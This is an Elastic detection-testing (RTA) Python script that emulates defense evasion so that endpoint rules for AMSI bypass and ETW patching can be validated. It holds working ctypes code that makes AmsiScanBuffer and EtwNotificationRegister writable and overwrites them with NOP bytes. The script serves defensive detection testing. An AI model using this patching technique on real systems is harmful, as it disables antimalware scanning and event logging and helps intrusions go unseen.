# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

import platform
import logging
import ctypes

from . import OSType, RuleMetadata, register_code_rta

log = logging.getLogger(__name__)


@register_code_rta(
    id="395d0e4c-e7f5-4c77-add7-92b1d2ba169e",
    name="evasion_patch_etw_amsi",
    platforms=[OSType.WINDOWS],
    siem_rules=[],
    endpoint_rules=[
        RuleMetadata(id="586bf106-b208-45fc-9401-727664175ca0", name="Potential AMSI Bypass via Memory Patching"),
        RuleMetadata(id="3046168a-91cb-4ecd-a061-b75b1df1c107", name="Potential Evasion via Event Tracing Patching"),
    ],
    techniques=["T1562.001"],
)
def main():

    from ctypes import windll, wintypes  # type: ignore

    kernel32 = windll.kernel32 # type: ignore

    LoadLibraryA = kernel32.LoadLibraryA # type: ignore
    LoadLibraryA.argtypes = [wintypes.LPCSTR] # type: ignore
    LoadLibraryA.restype = wintypes.HMODULE # type: ignore

    GetProcAddress = kernel32.GetProcAddress # type: ignore
    GetProcAddress.argtypes = [wintypes.HMODULE, wintypes.LPCSTR] # type: ignore
    GetProcAddress.restype = ctypes.c_void_p # type: ignore

    VirtualProtect = kernel32.VirtualProtect # type: ignore
    VirtualProtect.argtypes = [wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.PDWORD] # type: ignore
    VirtualProtect.restype = wintypes.BOOL # type: ignore

    GetCurrentProcess = kernel32.GetCurrentProcess # type: ignore
    GetCurrentProcess.restype = wintypes.HANDLE # type: ignore

    WriteProcessMemory = kernel32.WriteProcessMemory # type: ignore
    WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t, wintypes.LPVOID] # type: ignore
    WriteProcessMemory.restype = wintypes.BOOL # type: ignore

    GetModuleHandleA = kernel32.GetModuleHandleA # type: ignore
    GetModuleHandleA.restype = wintypes.HANDLE # type: ignore
    GetModuleHandleA.argtypes = [wintypes.LPCSTR] # type: ignore

    RWX = 0x40  # PAGE_READ_WRITE_EXECUTE
    OLD_PROTECTION = wintypes.LPDWORD(ctypes.c_ulong(0)) # type: ignore

    arch = platform.architecture()[0]

    if arch == "64bit":
        log.info("Using x64 based patch")
        patch = (ctypes.c_char * 6)(0x90, 0x90, 0x90, 0x90, 0x90, 0x90)
    else:
        log.info("Using x86 based patch")
        patch = (ctypes.c_char * 8)(0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90)

    lib = LoadLibraryA(b"amsi.dll") # type: ignore
    if lib:
        log.info(f"Loaded amsi.dll at {hex(lib)}") # type: ignore

    amsi = GetProcAddress(lib, b"AmsiScanBuffer") # type: ignore
    etw = GetProcAddress(GetModuleHandleA(b"ntdll.dll"), b"EtwNotificationRegister") # type: ignore
    if amsi and etw:
        log.info(f"Address of AmsiScanBuffer(): {hex(amsi)}") # type: ignore
        log.info(f"Address of EtwEventWrite(): {hex(etw)}") # type: ignore

    amsi_rwx = VirtualProtect(amsi, ctypes.sizeof(patch), RWX, OLD_PROTECTION) # type: ignore
    etw_rwx = VirtualProtect(etw, ctypes.sizeof(patch), RWX, OLD_PROTECTION) # type: ignore
    if amsi_rwx and etw_rwx:
        log.info("Changed Proctection of AmsiScanBuffer and EtwNotificationRegister to RWX")

    c_null = ctypes.c_int(0)
    amsi_bypass = WriteProcessMemory(GetCurrentProcess(), amsi, patch, ctypes.sizeof(patch), ctypes.byref(c_null)) # type: ignore
    etw_bypass = WriteProcessMemory(GetCurrentProcess(), etw, patch, ctypes.sizeof(patch), ctypes.byref(c_null)) # type: ignore
    if amsi_bypass and etw_bypass:
        log.info("[*] RTA Done - Patched AmsiScanBuffer & EtwNotificationRegister!")
